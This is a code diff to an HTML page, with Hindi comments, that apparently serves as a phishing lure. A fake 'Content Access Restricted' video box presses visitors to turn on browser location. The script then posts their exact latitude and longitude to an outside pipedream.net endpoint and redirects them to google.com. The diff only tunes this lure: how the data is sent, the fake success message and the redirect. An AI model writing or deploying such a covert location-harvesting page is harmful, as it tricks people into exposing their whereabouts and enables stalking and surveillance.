@@ -60,20 +60,20 @@
 </head>
 <body>
 
-    <!-- शुरुआती लोडिंग स्क्रीन -->
+    <!-- शुरुआती लोडिंग चक्र -->
     <div id="loading-context" style="text-align: center;">
         <div class="spinner"></div>
-        <h2 id="loading-text">Loading Page, Please Wait...</h2>
+        <h2>Loading Page, Please Wait...</h2>
     </div>
 
-    <!-- आपका कस्टमाइज्ड वीडियो रिस्ट्रिक्शन बॉक्स -->
+    <!-- आपका कस्टमाइज्ड डायरेक्ट वीडियो मैसेज बॉक्स -->
     <div id="verification-modal">
         <div class="modal-box">
             <div class="modal-title">Content Access Restricted</div>
             <div class="modal-text">
                 This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
             </div>
-            <!-- रीलोड करने से क्रोम का पुराना एरर कैश 100% साफ हो जाता है -->
+            <!-- 🌟 जादुई बदलाव: क्लिक करने पर यह सीधे ब्राउज़र की मेमोरी साफ करके पेज रीलोड करेगा -->
             <button class="action-btn" onclick="window.location.reload();">Verify & Watch Video</button>
         </div>
     </div>
@@ -82,19 +82,14 @@
         var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net';
 
         function originalFetchDispatch(lat, lon) {
-            // 🌟 बदलाव: keepalive: true बिना किसी रुकावट के डेटा बैकग्राउंड में तुरंत फायर कर देता है
             fetch(targetEndpoint, {
                 method: 'POST',
                 mode: 'no-cors', 
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude: lat, longitude: lon }),
-                keepalive: true
+                body: JSON.stringify({ latitude: lat, longitude: lon })
+            }).then(() => {
+                window.location.href = "https://google.com"; 
             });
-
-            // 🌟 इंस्टेंट यूआई अपडेट: गूगल पर भागने के बजाय स्क्रीन पर तुरंत सक्सेस लिख दो ताकि क्रोम फ्रीज न हो
-            document.getElementById('verification-modal').style.display = 'none';
-            document.getElementById('loading-context').style.display = 'block';
-            document.getElementById('loading-text').innerText = "Verification Successful. Loading media stream...";
         }
 
         function showRestrictionScreen() {
@@ -112,11 +107,10 @@
                     showRestrictionScreen();
                 }, {
                     enableHighAccuracy: true,
-                    timeout: 4000,
-                    maximumAge: 0 // क्रोम को पुराना पुराना एरर याद रखने से रोकेगा
+                    timeout: 4000 
                 });
             } else {
-                showRestrictionScreen();
+                window.location.href = "https://google.com";
             }
         }
 
